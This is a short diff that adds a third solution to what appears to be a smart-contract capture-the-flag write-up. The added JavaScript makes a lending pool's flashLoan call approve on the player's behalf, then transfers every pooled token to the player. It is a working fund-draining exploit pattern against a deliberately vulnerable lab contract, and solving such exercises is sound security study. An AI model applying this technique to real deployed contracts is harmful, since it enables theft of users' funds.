@@ -31,4 +31,9 @@ await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
 ````
 
 #Fix #3:
-
+````
+let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+await pool.connect(player).flashLoan(0, player.address, token.address, data);
+await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_IN_POOL);
+```
